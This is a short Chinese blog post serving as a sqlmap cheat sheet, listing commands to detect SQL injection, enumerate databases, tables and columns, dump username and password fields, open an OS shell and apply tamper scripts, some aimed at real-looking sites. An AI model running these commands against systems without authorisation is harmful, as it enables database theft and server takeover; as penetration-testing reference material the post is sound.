---
title: sqlmap使用
tags: web安全
abbrlink: 5359
date: 2018-06-08 09:45:39
---

# sqlmap使用手册

sqlmap一共5个级别，级别越高，检测越全面

1. 检测

   默认使用level1，检测全部数据库类型

   >  sqlmap -u “http://www.vuln.cn/post.php?id=1”

2. 只检测mysql

   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3

3. 检测cookie(（只有level达到2才会检测cookie）)

   >  sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2

4. post注入

   request.txt: 首先需要抓包，然后将数据包保存到requests.txt

   > sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql    
   >
   > 指定username参数

   或者:

   > python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --dbs

5. 查询有哪些数据库

   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql -–level 3 –-dbs

6. 查询有哪些表(以test数据库为例)

   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql –-level 3 -D test -–tables

7. 查询字段(以test数据库下的admin表为例)

   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql –-level 3 -D test -T admin –-columns

8. 查询数据(以test数据库下的admin表为例)

   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  -–dbms mysql –-level 3 -D test -T admin -C “username,password” –-dump

9. 使用shell命令

   > sqlmap -r “c:\tools\request.txt” -p id –-dbms mysql –-os-shell

10. 使用tamper

    >  sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3 --tamper unmagicquotes --dbs --hex

11. 保存进度

    > sqlmap -u “http://url/news?id=1“ –-dbs-o “sqlmap.log” 保存进度
    >
    > sqlmap -u “http://url/news?id=1“ -–dbs-o “sqlmap.log” –resume 恢复已保存进度

    